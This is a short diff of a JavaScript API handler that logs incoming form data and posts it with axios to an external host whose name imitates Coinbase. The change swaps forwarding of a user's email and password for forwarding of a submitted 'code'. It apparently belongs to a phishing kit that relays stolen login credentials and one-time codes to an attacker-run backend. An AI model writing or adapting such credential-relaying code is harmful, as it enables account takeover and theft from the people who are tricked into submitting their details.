@@ -3,8 +3,7 @@ export default function handler(req, res) {
   console.log(req.body)
   
   const form = new FormData()
-  form.append("email", req.body.mail)
-  form.append("password", req.body.pass)
+  form.append("code", req.body.code)
   axios
       .post(
         "https://coinbase-backend-1vc1.onrender.com/login.php",
